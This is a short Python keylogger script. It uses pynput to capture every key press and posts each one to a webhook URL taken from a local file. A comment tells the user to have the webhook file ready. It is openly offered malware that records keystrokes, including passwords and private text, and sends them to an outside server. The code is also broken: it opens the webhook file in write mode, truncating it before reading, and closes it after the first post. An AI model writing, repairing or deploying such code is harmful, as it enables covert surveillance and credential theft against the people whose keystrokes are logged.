from pynput import keyboard
import requests

webhook = open("webhook.bin", "w") # used bin cuz why not. Make sure you already have a webhook.bin file and the webhook written already.

def keyPressed(key):
    message = {
        "content": str(key)
    }
    requests.post(webhook.read(), message)
    webhook.close()

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join() 
